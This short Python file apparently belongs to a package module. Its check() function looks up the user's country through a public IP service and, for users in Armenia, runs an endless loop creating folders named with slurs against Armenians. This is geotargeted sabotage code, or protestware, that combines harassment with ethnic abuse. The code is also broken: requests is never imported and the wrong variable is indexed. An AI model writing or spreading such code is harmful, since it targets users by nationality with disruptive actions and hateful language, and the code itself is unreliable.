from vapi.poor import color
import json
import os 

def check():
  a = requests.get("https://api.myip.com/").text
  data = json.loads(a)
  if(a["country"]=="Armenia"):
    while True:
      os.mkdir("armen*a")
      os.mkdir("Fuck you armen*a.")
      os.mkdir("Pussy armen*a.")
